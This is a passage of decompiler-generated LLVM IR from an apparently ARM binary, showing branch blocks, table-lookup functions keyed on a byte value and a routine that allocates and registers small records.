dec_label_pc_a3a4:                                ; preds = %dec_label_pc_a394, %dec_label_pc_a43c
  %v0_a3a4 = load i32, i32* @r4, align 4
  %v1_a3a4 = add i32 %v0_a3a4, 28
  %v2_a3a4 = inttoptr i32 %v1_a3a4 to i32*
  %v3_a3a4 = load i32, i32* %v2_a3a4, align 4
  store i32 %v3_a3a4, i32* %r0.global-to-local, align 4
  %v2_a3a8 = icmp eq i32 %v3_a3a4, 0
  %v0_a3ac = load i32, i32* %r5.global-to-local, align 4
  %v2_a3ac = add i32 %v0_a3a4, 24
  %v3_a3ac = inttoptr i32 %v2_a3ac to i32*
  store i32 %v0_a3ac, i32* %v3_a3ac, align 4
  br i1 %v2_a3a8, label %dec_label_pc_a3b4, label %dec_label_pc_a46c

dec_label_pc_a3b4:                                ; preds = %dec_label_pc_a3a4, %dec_label_pc_a454, %dec_label_pc_a46c
  %v0_a3b4 = load i32, i32* %r5.global-to-local, align 4
  %v1_a3b4 = load i32, i32* @r4, align 4
  %v2_a3b4 = add i32 %v1_a3b4, 28
  %v3_a3b4 = inttoptr i32 %v2_a3b4 to i32*
  store i32 %v0_a3b4, i32* %v3_a3b4, align 4
  %v2_a3b8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_a3b8, i32* @r4, align 4
  store i32 %v6_a32c, i32* @r5, align 4
  store i32 %v9_a32c, i32* @lr, align 4
  %v0_a3bc = call i32 @function_10370()
  store i32 %v0_a3bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a3c0

dec_label_pc_a3c0:                                ; preds = %dec_label_pc_a32c, %dec_label_pc_a3b4
  %v0_a3c4 = phi i32 [ %v2_a334, %dec_label_pc_a32c ], [ %v0_a3bc, %dec_label_pc_a3b4 ]
  %v2_a3c4 = call i32 @function_12f9c(i32 %v0_a3c4, i32 9)
  store i32 %v2_a3c4, i32* %r0.global-to-local, align 4
  %v0_a3c8 = load i32, i32* @r4, align 4
  %v1_a3c8 = add i32 %v0_a3c8, 4
  %v2_a3c8 = inttoptr i32 %v1_a3c8 to i32*
  %v3_a3c8 = load i32, i32* %v2_a3c8, align 4
  store i32 %v3_a3c8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v2_a3d0 = icmp eq i32 %v3_a3c8, 0
  %v2_a3d4 = inttoptr i32 %v0_a3c8 to i32*
  store i32 0, i32* %v2_a3d4, align 4
  br i1 %v2_a3d0, label %dec_label_pc_a3c0.dec_label_pc_a354_crit_edge, label %dec_label_pc_a3c0.dec_label_pc_a3dc_crit_edge

dec_label_pc_a3c0.dec_label_pc_a3dc_crit_edge:    ; preds = %dec_label_pc_a3c0
  %v0_a3e0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a3dc

dec_label_pc_a3c0.dec_label_pc_a354_crit_edge:    ; preds = %dec_label_pc_a3c0
  %v0_a354.pre = load i32, i32* @r4, align 4
  %v0_a35c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_a354

dec_label_pc_a3dc:                                ; preds = %dec_label_pc_a3c0.dec_label_pc_a3dc_crit_edge, %dec_label_pc_a340
  %v0_a3e0 = phi i32 [ %v0_a3e0.pre, %dec_label_pc_a3c0.dec_label_pc_a3dc_crit_edge ], [ %v3_a340, %dec_label_pc_a340 ]
  %v2_a3e0 = call i32 @function_12f9c(i32 %v0_a3e0, i32 9)
  store i32 %v2_a3e0, i32* %r0.global-to-local, align 4
  %v0_a3e4 = load i32, i32* @r4, align 4
  %v1_a3e4 = add i32 %v0_a3e4, 8
  %v2_a3e4 = inttoptr i32 %v1_a3e4 to i32*
  %v3_a3e4 = load i32, i32* %v2_a3e4, align 4
  store i32 %v3_a3e4, i32* %r0.global-to-local, align 4
  %v2_a3e8 = icmp eq i32 %v3_a3e4, 0
  %v0_a3ec = load i32, i32* %r5.global-to-local, align 4
  %v2_a3ec = add i32 %v0_a3e4, 4
  %v3_a3ec = inttoptr i32 %v2_a3ec to i32*
  store i32 %v0_a3ec, i32* %v3_a3ec, align 4
  br i1 %v2_a3e8, label %dec_label_pc_a364, label %dec_label_pc_a3f4

dec_label_pc_a3f4:                                ; preds = %dec_label_pc_a354, %dec_label_pc_a3dc
  %v0_a3f8 = load i32, i32* %r0.global-to-local, align 4
  %v2_a3f8 = call i32 @function_12f9c(i32 %v0_a3f8, i32 9)
  store i32 %v2_a3f8, i32* %r0.global-to-local, align 4
  %v0_a3fc = load i32, i32* @r4, align 4
  %v1_a3fc = add i32 %v0_a3fc, 12
  %v2_a3fc = inttoptr i32 %v1_a3fc to i32*
  %v3_a3fc = load i32, i32* %v2_a3fc, align 4
  store i32 %v3_a3fc, i32* %r0.global-to-local, align 4
  %v2_a400 = icmp eq i32 %v3_a3fc, 0
  %v0_a404 = load i32, i32* %r5.global-to-local, align 4
  %v2_a404 = add i32 %v0_a3fc, 8
  %v3_a404 = inttoptr i32 %v2_a404 to i32*
  store i32 %v0_a404, i32* %v3_a404, align 4
  br i1 %v2_a400, label %dec_label_pc_a374, label %dec_label_pc_a40c

dec_label_pc_a40c:                                ; preds = %dec_label_pc_a364, %dec_label_pc_a3f4
  %v0_a410 = load i32, i32* %r0.global-to-local, align 4
  %v2_a410 = call i32 @function_12f9c(i32 %v0_a410, i32 9)
  store i32 %v2_a410, i32* %r0.global-to-local, align 4
  %v0_a414 = load i32, i32* @r4, align 4
  %v1_a414 = add i32 %v0_a414, 16
  %v2_a414 = inttoptr i32 %v1_a414 to i32*
  %v3_a414 = load i32, i32* %v2_a414, align 4
  store i32 %v3_a414, i32* %r0.global-to-local, align 4
  %v2_a418 = icmp eq i32 %v3_a414, 0
  %v0_a41c = load i32, i32* %r5.global-to-local, align 4
  %v2_a41c = add i32 %v0_a414, 12
  %v3_a41c = inttoptr i32 %v2_a41c to i32*
  store i32 %v0_a41c, i32* %v3_a41c, align 4
  br i1 %v2_a418, label %dec_label_pc_a384, label %dec_label_pc_a424

dec_label_pc_a424:                                ; preds = %dec_label_pc_a374, %dec_label_pc_a40c
  %v0_a428 = load i32, i32* %r0.global-to-local, align 4
  %v2_a428 = call i32 @function_12f9c(i32 %v0_a428, i32 9)
  store i32 %v2_a428, i32* %r0.global-to-local, align 4
  %v0_a42c = load i32, i32* @r4, align 4
  %v1_a42c = add i32 %v0_a42c, 20
  %v2_a42c = inttoptr i32 %v1_a42c to i32*
  %v3_a42c = load i32, i32* %v2_a42c, align 4
  store i32 %v3_a42c, i32* %r0.global-to-local, align 4
  %v2_a430 = icmp eq i32 %v3_a42c, 0
  %v0_a434 = load i32, i32* %r5.global-to-local, align 4
  %v2_a434 = add i32 %v0_a42c, 16
  %v3_a434 = inttoptr i32 %v2_a434 to i32*
  store i32 %v0_a434, i32* %v3_a434, align 4
  br i1 %v2_a430, label %dec_label_pc_a394, label %dec_label_pc_a43c

dec_label_pc_a43c:                                ; preds = %dec_label_pc_a384, %dec_label_pc_a424
  %v0_a440 = load i32, i32* %r0.global-to-local, align 4
  %v2_a440 = call i32 @function_12f9c(i32 %v0_a440, i32 9)
  store i32 %v2_a440, i32* %r0.global-to-local, align 4
  %v0_a444 = load i32, i32* @r4, align 4
  %v1_a444 = add i32 %v0_a444, 24
  %v2_a444 = inttoptr i32 %v1_a444 to i32*
  %v3_a444 = load i32, i32* %v2_a444, align 4
  store i32 %v3_a444, i32* %r0.global-to-local, align 4
  %v2_a448 = icmp eq i32 %v3_a444, 0
  %v0_a44c = load i32, i32* %r5.global-to-local, align 4
  %v2_a44c = add i32 %v0_a444, 20
  %v3_a44c = inttoptr i32 %v2_a44c to i32*
  store i32 %v0_a44c, i32* %v3_a44c, align 4
  br i1 %v2_a448, label %dec_label_pc_a3a4, label %dec_label_pc_a454

dec_label_pc_a454:                                ; preds = %dec_label_pc_a394, %dec_label_pc_a43c
  %v0_a458 = load i32, i32* %r0.global-to-local, align 4
  %v2_a458 = call i32 @function_12f9c(i32 %v0_a458, i32 9)
  store i32 %v2_a458, i32* %r0.global-to-local, align 4
  %v0_a45c = load i32, i32* @r4, align 4
  %v1_a45c = add i32 %v0_a45c, 28
  %v2_a45c = inttoptr i32 %v1_a45c to i32*
  %v3_a45c = load i32, i32* %v2_a45c, align 4
  store i32 %v3_a45c, i32* %r0.global-to-local, align 4
  %v2_a460 = icmp eq i32 %v3_a45c, 0
  %v0_a464 = load i32, i32* %r5.global-to-local, align 4
  %v2_a464 = add i32 %v0_a45c, 24
  %v3_a464 = inttoptr i32 %v2_a464 to i32*
  store i32 %v0_a464, i32* %v3_a464, align 4
  br i1 %v2_a460, label %dec_label_pc_a3b4, label %dec_label_pc_a46c

dec_label_pc_a46c:                                ; preds = %dec_label_pc_a3a4, %dec_label_pc_a454
  %v0_a470 = load i32, i32* %r0.global-to-local, align 4
  %v2_a470 = call i32 @function_12f9c(i32 %v0_a470, i32 9)
  store i32 %v2_a470, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a3b4

; uselistorder directives
  uselistorder i32* %r5.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1, 10, 8, 9, 11, 12, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 2, 16, 1, 4, 18, 3, 6, 20, 5, 8, 22, 7, 10, 24, 9, 12, 26, 11, 15, 13, 14, 30, 0, 17, 19, 21, 23, 25, 27, 28, 29 }
  uselistorder label %dec_label_pc_a46c, { 1, 0 }
  uselistorder label %dec_label_pc_a454, { 1, 0 }
  uselistorder label %dec_label_pc_a43c, { 1, 0 }
  uselistorder label %dec_label_pc_a424, { 1, 0 }
  uselistorder label %dec_label_pc_a40c, { 1, 0 }
  uselistorder label %dec_label_pc_a3f4, { 1, 0 }
  uselistorder label %dec_label_pc_a3c0, { 1, 0 }
  uselistorder label %dec_label_pc_a3b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a3a4, { 1, 0 }
  uselistorder label %dec_label_pc_a394, { 1, 0 }
  uselistorder label %dec_label_pc_a384, { 1, 0 }
  uselistorder label %dec_label_pc_a374, { 1, 0 }
  uselistorder label %dec_label_pc_a364, { 1, 0 }
}

define i32 @function_a47c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_a47c:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_a47c = urem i32 %arg1, 256
  %v2_a480 = icmp eq i32 %v1_a47c, 0
  %v3_a484 = load i32, i32* @r4, align 4
  br i1 %v2_a480, label %dec_label_pc_a4cc, label %dec_label_pc_a490

dec_label_pc_a490:                                ; preds = %dec_label_pc_a47c
  %v0_a490 = load i32, i32* %r1.global-to-local, align 4
  %v1_a490 = add i32 %v0_a490, 4
  %v2_a490 = inttoptr i32 %v1_a490 to i8*
  %v3_a490 = load i8, i8* %v2_a490, align 1
  %v4_a490 = zext i8 %v3_a490 to i32
  %v1_a494 = urem i32 %arg3, 256
  %v9_a498 = icmp eq i32 %v4_a490, %v1_a494
  br i1 %v9_a498, label %dec_label_pc_a4d4, label %dec_label_pc_a4bc.preheader

dec_label_pc_a4bc.preheader:                      ; preds = %dec_label_pc_a490
  br label %dec_label_pc_a4bc

dec_label_pc_a4ac:                                ; preds = %dec_label_pc_a4bc
  %v1_a4ac = add i32 %v0_a4b4.in, 12
  %v2_a4ac = inttoptr i32 %v1_a4ac to i8*
  %v3_a4ac = load i8, i8* %v2_a4ac, align 1
  %v4_a4ac = zext i8 %v3_a4ac to i32
  %v9_a4b0 = icmp eq i32 %v1_a494, %v4_a4ac
  br i1 %v9_a4b0, label %dec_label_pc_a4d4, label %dec_label_pc_a4bc

dec_label_pc_a4bc:                                ; preds = %dec_label_pc_a4bc.preheader, %dec_label_pc_a4ac
  %v0_a4b4.in = phi i32 [ %v0_a490, %dec_label_pc_a4bc.preheader ], [ %v0_a4b4, %dec_label_pc_a4ac ]
  %v0_a4bc = phi i32 [ 0, %dec_label_pc_a4bc.preheader ], [ %v1_a4bc, %dec_label_pc_a4ac ]
  %v0_a4b4 = add i32 %v0_a4b4.in, 8
  %v1_a4bc = add i32 %v0_a4bc, 1
  %v9_a4c0 = icmp eq i32 %v1_a47c, %v1_a4bc
  store i32 %v0_a4b4, i32* %r1.global-to-local, align 4
  br i1 %v9_a4c0, label %dec_label_pc_a4cc, label %dec_label_pc_a4ac

dec_label_pc_a4cc:                                ; preds = %dec_label_pc_a4bc, %dec_label_pc_a4d4, %dec_label_pc_a47c
  store i32 %v3_a484, i32* @r4, align 4
  ret i32 %arg4

dec_label_pc_a4d4:                                ; preds = %dec_label_pc_a4ac, %dec_label_pc_a490
  %v0_a4d4 = phi i32 [ %v0_a490, %dec_label_pc_a490 ], [ %v0_a4b4, %dec_label_pc_a4ac ]
  %v1_a4d4 = inttoptr i32 %v0_a4d4 to i32*
  %v2_a4d4 = load i32, i32* %v1_a4d4, align 4
  store i32 %v2_a4d4, i32* @r0, align 4
  %v2_a4d8 = icmp eq i32 %v2_a4d4, 0
  br i1 %v2_a4d8, label %dec_label_pc_a4cc, label %dec_label_pc_a4e0

dec_label_pc_a4e0:                                ; preds = %dec_label_pc_a4d4
  store i32 %v3_a484, i32* @r4, align 4
  %v1_a4e4 = call i32 @function_13570(i32 %v2_a4d4)
  ret i32 %v1_a4e4

; uselistorder directives
  uselistorder i32 %v1_a4bc, { 1, 0 }
  uselistorder i32 %v0_a4b4, { 1, 0, 2 }
  uselistorder i32 %v0_a4b4.in, { 1, 0 }
  uselistorder i32 %v1_a494, { 1, 0 }
  uselistorder i32 %v0_a490, { 1, 0, 2 }
  uselistorder i32 %v3_a484, { 1, 0 }
  uselistorder i32 %v1_a47c, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a4cc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a4bc, { 1, 0 }
}

define i32 @function_a4e8(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a4e8:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_a4e8 = urem i32 %arg1, 256
  %v2_a4ec = icmp eq i32 %v1_a4e8, 0
  %v3_a4f0 = load i32, i32* @r4, align 4
  %v6_a4f0 = load i32, i32* @lr, align 4
  br i1 %v2_a4ec, label %dec_label_pc_a538, label %dec_label_pc_a4fc

dec_label_pc_a4fc:                                ; preds = %dec_label_pc_a4e8
  %v0_a4fc = load i32, i32* %r1.global-to-local, align 4
  %v1_a4fc = add i32 %v0_a4fc, 4
  %v2_a4fc = inttoptr i32 %v1_a4fc to i8*
  %v3_a4fc = load i8, i8* %v2_a4fc, align 1
  %v4_a4fc = zext i8 %v3_a4fc to i32
  %v1_a500 = urem i32 %arg3, 256
  %v9_a504 = icmp eq i32 %v4_a4fc, %v1_a500
  br i1 %v9_a504, label %dec_label_pc_a540, label %dec_label_pc_a528.preheader

dec_label_pc_a528.preheader:                      ; preds = %dec_label_pc_a4fc
  br label %dec_label_pc_a528

dec_label_pc_a518:                                ; preds = %dec_label_pc_a528
  %v1_a518 = add i32 %v0_a520.in, 12
  %v2_a518 = inttoptr i32 %v1_a518 to i8*
  %v3_a518 = load i8, i8* %v2_a518, align 1
  %v4_a518 = zext i8 %v3_a518 to i32
  %v9_a51c = icmp eq i32 %v1_a500, %v4_a518
  br i1 %v9_a51c, label %dec_label_pc_a540, label %dec_label_pc_a528

dec_label_pc_a528:                                ; preds = %dec_label_pc_a528.preheader, %dec_label_pc_a518
  %v0_a520.in = phi i32 [ %v0_a4fc, %dec_label_pc_a528.preheader ], [ %v0_a520, %dec_label_pc_a518 ]
  %v0_a528 = phi i32 [ 0, %dec_label_pc_a528.preheader ], [ %v1_a528, %dec_label_pc_a518 ]
  %v0_a520 = add i32 %v0_a520.in, 8
  %v1_a528 = add i32 %v0_a528, 1
  store i32 %v1_a528, i32* @lr, align 4
  %v9_a52c = icmp eq i32 %v1_a4e8, %v1_a528
  store i32 %v0_a520, i32* %r1.global-to-local, align 4
  br i1 %v9_a52c, label %dec_label_pc_a538, label %dec_label_pc_a518

dec_label_pc_a538:                                ; preds = %dec_label_pc_a528, %dec_label_pc_a540, %dec_label_pc_a4e8
  store i32 %v3_a4f0, i32* @r4, align 4
  ret i32 %arg4

dec_label_pc_a540:                                ; preds = %dec_label_pc_a518, %dec_label_pc_a4fc
  %v0_a540 = phi i32 [ %v0_a4fc, %dec_label_pc_a4fc ], [ %v0_a520, %dec_label_pc_a518 ]
  %v1_a540 = inttoptr i32 %v0_a540 to i32*
  %v2_a540 = load i32, i32* %v1_a540, align 4
  %v2_a544 = icmp eq i32 %v2_a540, 0
  br i1 %v2_a544, label %dec_label_pc_a538, label %dec_label_pc_a54c

dec_label_pc_a54c:                                ; preds = %dec_label_pc_a540
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 %v3_a4f0, i32* @r4, align 4
  store i32 %v6_a4f0, i32* @lr, align 4
  %v2_a554 = inttoptr i32 %v2_a540 to i8*
  %v3_a554 = call i32 @function_12608(i8* %v2_a554, i32 10)
  ret i32 %v3_a554

; uselistorder directives
  uselistorder i32 %v1_a528, { 1, 2, 0 }
  uselistorder i32 %v0_a520, { 1, 0, 2 }
  uselistorder i32 %v0_a520.in, { 1, 0 }
  uselistorder i32 %v1_a500, { 1, 0 }
  uselistorder i32 %v0_a4fc, { 1, 0, 2 }
  uselistorder i32 %v3_a4f0, { 1, 0 }
  uselistorder i32 %v1_a4e8, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_a538, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a528, { 1, 0 }
}

define i32 @function_a558(i32 %arg1) local_unnamed_addr {
dec_label_pc_a558:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_a558 = load i32, i32* @r4, align 4
  store i32 %v3_a558, i32* %stack_var_-20, align 4
  %v6_a558 = load i32, i32* @r5, align 4
  %v9_a558 = load i32, i32* @r6, align 4
  %v12_a558 = load i32, i32* @r7, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_a564 = call i32 @function_13a94(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_1e3b0.55 to i32), i32* @r4, align 4
  %v2_a56c = load i8, i8* bitcast (i8** @global_var_1e3b0.55 to i8*), align 4
  %v3_a56c = zext i8 %v2_a56c to i32
  store i32 ptrtoint (i32* @global_var_1e3b4.57 to i32), i32* @r6, align 4
  store i32 53540, i32* %r2.global-to-local, align 4
  store i32 %v2_a564, i32* @r5, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a580 = mul nuw nsw i32 %v3_a56c, 4
  store i32 %v3_a580, i32* %r1.global-to-local, align 4
  %v2_a584 = load i32, i32* @global_var_1e3b4.57, align 4
  %v2_a588 = inttoptr i32 %v2_a564 to i32*
  store i32 53540, i32* %v2_a588, align 4
  %v3_a58c = load i32, i32* @r5, align 4
  %v4_a58c = add i32 %v3_a58c, 4
  %v5_a58c = inttoptr i32 %v4_a58c to i8*
  store i8 0, i8* %v5_a58c, align 1
  %v0_a590 = load i32, i32* %r1.global-to-local, align 4
  %v1_a590 = add i32 %v0_a590, 4
  store i32 %v1_a590, i32* %r1.global-to-local, align 4
  %v5_a594 = call i32 @function_13bdc(i32 %v2_a584, i32 %v1_a590, i32 53540, i32 0)
  %v2_a598 = load i8, i8* bitcast (i8** @global_var_1e3b0.55 to i8*), align 4
  %v3_a598 = zext i8 %v2_a598 to i32
  store i32 %v3_a598, i32* %r3.global-to-local, align 4
  store i32 %v5_a594, i32* %ip.global-to-local, align 4
  %v0_a5a0 = load i32, i32* @r5, align 4
  %v5_a5a0 = mul nuw nsw i32 %v3_a598, 4
  %v6_a5a0 = add i32 %v5_a5a0, %v5_a594
  %v7_a5a0 = inttoptr i32 %v6_a5a0 to i32*
  store i32 %v0_a5a0, i32* %v7_a5a0, align 4
  store i32 ptrtoint (i8* @global_var_1e3b1.66 to i32), i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v3_a5b0 = load i32, i32* @r4, align 4
  %v4_a5b0 = inttoptr i32 %v3_a5b0 to i8*
  store i8 ptrtoint (i8* @global_var_1e3b1.66 to i8), i8* %v4_a5b0, align 1
  %v0_a5b4 = load i32, i32* %ip.global-to-local, align 4
  %v1_a5b4 = load i32, i32* @r6, align 4
  %v2_a5b4 = inttoptr i32 %v1_a5b4 to i32*
  store i32 %v0_a5b4, i32* %v2_a5b4, align 4
  %v2_a5b8 = call i32 @function_13a94(i32 1, i32 8)
  %v2_a5bc = load i8, i8* bitcast (i8** @global_var_1e3b0.55 to i8*), align 4
  %v3_a5bc = zext i8 %v2_a5bc to i32
  store i32 ptrtoint (i32* @global_var_d7b0.68 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  store i32 %v2_a5b8, i32* @r5, align 4
  %v3_a5cc = mul nuw nsw i32 %v3_a5bc, 4
  store i32 %v3_a5cc, i32* %r1.global-to-local, align 4
  %v2_a5d0 = load i32, i32* @global_var_1e3b4.57, align 4
  %v2_a5d4 = inttoptr i32 %v2_a5b8 to i32*
  store i32 ptrtoint (i32* @global_var_d7b0.68 to i32), i32* %v2_a5d4, align 4
  %v0_a5d8 = load i32, i32* @r7, align 4
  %v1_a5d8 = trunc i32 %v0_a5d8 to i8
  %v2_a5d8 = load i32, i32* @r5, align 4
  %v3_a5d8 = add i32 %v2_a5d8, 4
  %v4_a5d8 = inttoptr i32 %v3_a5d8 to i8*
  store i8 %v1_a5d8, i8* %v4_a5d8, align 1
  %v0_a5dc = load i32, i32* %r1.global-to-local, align 4
  %v1_a5dc = add i32 %v0_a5dc, 4
  store i32 %v1_a5dc, i32* %r1.global-to-local, align 4
  %v5_a5e0 = call i32 @function_13bdc(i32 %v2_a5d0, i32 %v1_a5dc, i32 sext (i8 ptrtoint (i8* @global_var_1e3b1.66 to i8) to i32), i32 ptrtoint (i32* @global_var_d7b0.68 to i32))
  %v2_a5e4 = load i8, i8* bitcast (i8** @global_var_1e3b0.55 to i8*), align 4
  %v3_a5e4 = zext i8 %v2_a5e4 to i32
  store i32 %v3_a5e4, i32* %r3.global-to-local, align 4
  store i32 %v5_a5e0, i32* %ip.global-to-local, align 4
  %v0_a5ec = load i32, i32* @r5, align 4
  %v5_a5ec = mul nuw nsw i32 %v3_a5e4, 4
  %v6_a5ec = add i32 %v5_a5ec, %v5_a5e0
  %v7_a5ec = inttoptr i32 %v6_a5ec to i32*
  store i32 %v0_a5ec, i32* %v7_a5ec, align 4
  %v0_a5f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_a5f0 = load i32, i32* @r7, align 4
  %v2_a5f0 = add i32 %v1_a5f0, %v0_a5f0
  store i32 %v2_a5f0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a5fc = load i32, i32* %ip.global-to-local, align 4
  %v1_a5fc = load i32, i32* @r6, align 4
  %v2_a5fc = inttoptr i32 %v1_a5fc to i32*
  store i32 %v0_a5fc, i32* %v2_a5fc, align 4
  %v0_a600 = load i32, i32* %r2.global-to-local, align 4
  %v1_a600 = trunc i32 %v0_a600 to i8
  %v2_a600 = load i32, i32* @r4, align 4
  %v3_a600 = inttoptr i32 %v2_a600 to i8*
  store i8 %v1_a600, i8* %v3_a600, align 1
  %v2_a604 = call i32 @function_13a94(i32 %v1_a5f0, i32 8)
  %v2_a608 = load i8, i8* bitcast (i8** @global_var_1e3b0.55 to i8*), align 4
  %v3_a608 = zext i8 %v2_a608 to i32
  store i32 ptrtoint (i32* @global_var_dc74.70 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a604, i32* @r5, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_a618 = mul nuw nsw i32 %v3_a608, 4
  store i32 %v3_a618, i32* %r1.global-to-local, align 4
  %v2_a61c = load i32, i32* @global_var_1e3b4.57, align 4
  %v2_a620 = inttoptr i32 %v2_a604 to i32*
  store i32 ptrtoint (i32* @global_var_dc74.70 to i32), i32* %v2_a620, align 4
  %v3_a624 = load i32, i32* @r5, align 4
  %v4_a624 = add i32 %v3_a624, 4
  %v5_a624 = inttoptr i32 %v4_a624 to i8*
  store i8 2, i8* %v5_a624, align 1
  %v0_a628 = load i32, i32* %r1.global-to-local, align 4
  %v1_a628 = add i32 %v0_a628, 4
  store i32 %v1_a628, i32* %r1.global-to-local, align 4
  %v5_a62c = call i32 @function_13bdc(i32 %v2_a61c, i32 %v1_a628, i32 ptrtoint (i32* @global_var_dc74.70 to i32), i32 2)
  %v2_a630 = load i8, i8* bitcast (i8** @global_var_1e3b0.55 to i8*), align 4
  %v3_a630 = zext i8 %v2_a630 to i32
  store i32 %v3_a630, i32* %r3.global-to-local, align 4
  store i32 %v5_a62c, i32* %ip.global-to-local, align 4
  %v0_a638 = load i32, i32* @r5, align 4
  %v5_a638 = mul nuw nsw i32 %v3_a630, 4
  %v6_a638 = add i32 %v5_a638, %v5_a62c
  %v7_a638 = inttoptr i32 %v6_a638 to i32*
  store i32 %v0_a638, i32* %v7_a638, align 4
  %v0_a63c = load i32, i32* %r3.global-to-local, align 4
  %v1_a63c = load i32, i32* @r7, align 4
  %v2_a63c = add i32 %v1_a63c, %v0_a63c
  store i32 %v2_a63c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a648 = load i32, i32* %ip.global-to-local, align 4
  %v1_a648 = load i32, i32* @r6, align 4
  %v2_a648 = inttoptr i32 %v1_a648 to i32*
  store i32 %v0_a648, i32* %v2_a648, align 4
  %v0_a64c = load i32, i32* %r2.global-to-local, align 4
  %v1_a64c = trunc i32 %v0_a64c to i8
  %v2_a64c = load i32, i32* @r4, align 4
  %v3_a64c = inttoptr i32 %v2_a64c to i8*
  store i8 %v1_a64c, i8* %v3_a64c, align 1
  %v2_a650 = call i32 @function_13a94(i32 %v1_a63c, i32 8)
  %v2_a654 = load i8, i8* bitcast (i8** @global_var_1e3b0.55 to i8*), align 4
  %v3_a654 = zext i8 %v2_a654 to i32
  store i32 ptrtoint (i32* @global_var_ce40.72 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a650, i32* @r5, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v3_a664 = mul nuw nsw i32 %v3_a654, 4
  store i32 %v3_a664, i32* %r1.global-to-local, align 4
  %v2_a668 = load i32, i32* @global_var_1e3b4.57, align 4
  %v2_a66c = inttoptr i32 %v2_a650 to i32*
  store i32 ptrtoint (i32* @global_var_ce40.72 to i32), i32* %v2_a66c, align 4
  %v3_a670 = load i32, i32* @r5, align 4
  %v4_a670 = add i32 %v3_a670, 4
  %v5_a670 = inttoptr i32 %v4_a670 to i8*
  store i8 9, i8* %v5_a670, align 1
  %v0_a674 = load i32, i32* %r1.global-to-local, align 4
  %v1_a674 = add i32 %v0_a674, 4
  store i32 %v1_a674, i32* %r1.global-to-local, align 4
  %v5_a678 = call i32 @function_13bdc(i32 %v2_a668, i32 %v1_a674, i32 ptrtoint (i32* @global_var_ce40.72 to i32), i32 9)
  %v2_a67c = load i8, i8* bitcast (i8** @global_var_1e3b0.55 to i8*), align 4
  %v3_a67c = zext i8 %v2_a67c to i32
  store i32 %v3_a67c, i32* %r3.global-to-local, align 4
  store i32 %v5_a678, i32* %ip.global-to-local, align 4
  %v0_a684 = load i32, i32* @r5, align 4
  %v5_a684 = mul nuw nsw i32 %v3_a67c, 4
  %v6_a684 = add i32 %v5_a684, %v5_a678
  %v7_a684 = inttoptr i32 %v6_a684 to i32*
  store i32 %v0_a684, i32* %v7_a684, align 4
  %v0_a688 = load i32, i32* %r3.global-to-local, align 4
  %v1_a688 = load i32, i32* @r7, align 4
  %v2_a688 = add i32 %v1_a688, %v0_a688
  store i32 %v2_a688, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a694 = load i32, i32* %ip.global-to-local, align 4
  %v1_a694 = load i32, i32* @r6, align 4
  %v2_a694 = inttoptr i32 %v1_a694 to i32*
  store i32 %v0_a694, i32* %v2_a694, align 4
  %v0_a698 = load i32, i32* %r2.global-to-local, align 4
  %v1_a698 = trunc i32 %v0_a698 to i8
  %v2_a698 = load i32, i32* @r4, align 4
  %v3_a698 = inttoptr i32 %v2_a698 to i8*
  store i8 %v1_a698, i8* %v3_a698, align 1
  %v2_a69c = call i32 @function_13a94(i32 %v1_a688, i32 8)
  %v2_a6a0 = load i8, i8* bitcast (i8** @global_var_1e3b0.55 to i8*), align 4
  %v3_a6a0 = zext i8 %v2_a6a0 to i32
  store i32 ptrtoint (i32* @global_var_c6fc.74 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a69c, i32* @r5, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v3_a6b0 = mul nuw nsw i32 %v3_a6a0, 4
  store i32 %v3_a6b0, i32* %r1.global-to-local, align 4
  %v2_a6b4 = load i32, i32* @global_var_1e3b4.57, align 4
  %v2_a6b8 = inttoptr i32 %v2_a69c to i32*
  store i32 ptrtoint (i32* @global_var_c6fc.74 to i32), i32* %v2_a6b8, align 4
  %v3_a6bc = load i32, i32* @r5, align 4
  %v4_a6bc = add i32 %v3_a6bc, 4
  %v5_a6bc = inttoptr i32 %v4_a6bc to i8*
  store i8 3, i8* %v5_a6bc, align 1
